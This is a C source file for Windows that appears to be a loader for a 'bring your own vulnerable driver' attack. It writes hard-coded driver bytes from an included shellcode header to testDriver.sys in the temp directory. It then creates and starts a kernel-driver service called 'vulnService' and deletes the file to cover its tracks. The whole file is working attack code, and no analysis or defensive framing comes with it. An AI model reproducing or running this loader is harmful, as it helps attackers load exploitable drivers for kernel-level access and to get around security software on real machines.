#include "shellcode.h"
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "Advapi32.lib")

int main() {

    //define parameters for api calls 
    DWORD dwBytesToWrite = (DWORD)(shellcode_size - 1);
    char tempBuffer[MAX_PATH];
    LPSTR tempPathBuffer = tempBuffer;
    LPDWORD bytesWritten = 0;
    LPCSTR serviceName = "vulnService";
    LPCSTR fileName = tempPathBuffer;

    //get path to temporary directory for driver creation
    GetTempPath2A(MAX_PATH, tempPathBuffer);
    strcat_s(tempPathBuffer, MAX_PATH, "testDriver.sys");

    //create driver file testDriver.sys in temp directory
    HANDLE fileHandle = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        printf("Create File error: %u", err);
        return 0;
    }

    //write hard coded bytes to newly created driver file
    if (!WriteFile(fileHandle, driverShellcode, dwBytesToWrite, bytesWritten, NULL)) {
        DWORD err = GetLastError();
        printf("Write File error: %u", err);
        return 0;
    }

    //close driver file to avoid future errors
    CloseHandle(fileHandle);

    //get handle to service control manager
    SC_HANDLE toControl = OpenSCManagerA(0, 0, SC_MANAGER_ALL_ACCESS);
    if (!toControl) {
        DWORD err = GetLastError();
        printf("Service Control Manager error: %u", err);
        return 0;
    }

    //create service with vulnerable driver
    SC_HANDLE serviceHandle = CreateServiceA(toControl, serviceName, NULL, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, fileName, NULL, NULL, NULL, NULL, NULL);
    if (serviceHandle == NULL) {
        DWORD errorLast = GetLastError();
        printf("Create Service: %u", errorLast);
        return 0;
    }

    //start vulnerable service
    if (StartService(serviceHandle, NULL, NULL) == 0) {
        DWORD errorLast = GetLastError();
        printf("Start Service: %u", errorLast);
        return 0;
    }

    if (!DeleteFileA(fileName)) {
        DWORD errorLast = GetLastError();
        printf("Delete File: %u", errorLast);
        return 0;
    }

    //clean up and close open handles
    CloseHandle(toControl);
    CloseHandle(serviceHandle);

    return 1;
}
